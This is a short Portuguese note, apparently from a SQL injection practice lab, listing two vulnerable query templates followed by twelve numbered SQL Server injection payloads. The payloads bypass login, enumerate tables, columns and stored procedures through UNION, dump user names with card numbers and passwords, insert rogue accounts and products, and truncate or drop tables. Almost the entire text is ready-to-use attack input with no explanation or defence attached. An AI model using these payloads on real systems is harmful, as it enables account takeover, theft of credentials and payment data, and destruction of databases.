Queries Utilizadas na Aplicação
SELECT name FROM users WHERE uname = '[string]' AND pass = '[string]'
SELECT name AS 'Produto', price AS 'Preço' FROM products WHERE name LIKE  '% [string] %'

1.
' or 1 = 1 --
' or 2 = 2 AND uname != 'bob' AND uname != 'caio' --

2.
njjk' UNION SELECT table_name, 11 FROM INFORMATION_SCHEMA.TABLES --

3.
njjk' UNION SELECT COLUMN_NAME, 99 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'--

4.	
njjk' UNION SELECT name + ' ' + cc +'  ' + pass, 10 FROM users --

5.	
';INSERT INTO users (uname, pass) VALUES ('hacked2', 'pass') --

6.
'; TRUNCATE TABLE products--

7.
'; INSERT INTO products (name, price) VALUES ('Hacked', 99999)--

8.
njjk' UNION SELECT @@VERSION, 2 --

9.
njjk' UNION SELECT name, Year(create_date) FROM sys.databases --

10.
njjk' UNION SELECT @@SERVERNAME, 99 FROM sys.databases --

11.
njjk' UNION SELECT ROUTINE_DEFINITION, 99  FROM db_testSqlInjection.information_schema.routines  WHERE routine_type = 'PROCEDURE'--

12.
' ; DROP TABLE users--
